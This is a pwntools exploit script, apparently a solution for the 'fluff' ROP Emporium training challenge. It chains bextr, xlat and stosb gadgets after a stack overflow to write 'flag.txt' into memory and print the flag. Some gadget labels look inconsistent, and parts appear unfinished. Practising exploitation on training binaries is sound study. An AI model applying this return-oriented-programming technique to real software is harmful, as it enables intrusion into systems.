#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
tbreak *(&pwnme + 150)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()
elf = ELF('fluff')                 #context.binary


ret_gadget = p64(0x400639) #ret
pop_rdi = p64(0x4006a3) # pop rdi; ret

#BEXTR destination (RBX), source (RCX), mask (RDX)
pop_rdx_rcx_add_3ef2_bextr = p64(0x40062a) # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret 

pop_rcx = p64(0x40062b) # pop rcx
al_into_rcx  = p64(0x4005e7) # add byte ptr [rcx], al ; pop rbp ; ret
xlat_rbx = p64(0x400628) #  xlat   BYTE PTR ds:[rbx] 
stosb_rdi = p64(0x400639) # stosb byte ptr [rdi], al ; ret

writable_area = 0x601028  
zero_area = 0x601100


#writable_area = 0x601030


flag_string = b'flag.txt'
char_locations = [] # contains the addressed of flag.txt chars

#for char in flag_string:
#    char_address = hex(read('fluff').find(char) + elf.address)
 #   char_locations.append(char_address)

char_address = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246, 0x400192]

offset_array = [0xb,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74]
offset_array = [int(i) for i in offset_array]


for i in range(len(char_address)):
    char_address[i] = char_address[i] - 0x003ef2

mask = p64(0x4000)
base_address = 0x400510
print_function = base_address
#0x750 + base_address 

payload = b'A' * 32 + p64(0)

i = 0
align = 11
for addr in char_address:
    
 #   payload += pop_rdx_rcx_add_3ef2_bextr + mask + p64(zero_area - 0x003ef2) + xlat_rbx
    # Qui carico su al il singolo carattere
#    real_address = addr - offset_array[i]
    payload += pop_rdx_rcx_add_3ef2_bextr + mask + p64(addr - offset_array[i]) + xlat_rbx
    #align = real_address + align
    # A questo punto devo spostare il singolo carattere nella zona di memoria che voglio
    payload += pop_rdi + p64(writable_area + i)
    payload += stosb_rdi 
    i = i + 1

payload += pop_rdi + p64(writable_area) + p64(print_function) 

io.sendlineafter('> ', payload)


io.interactive()

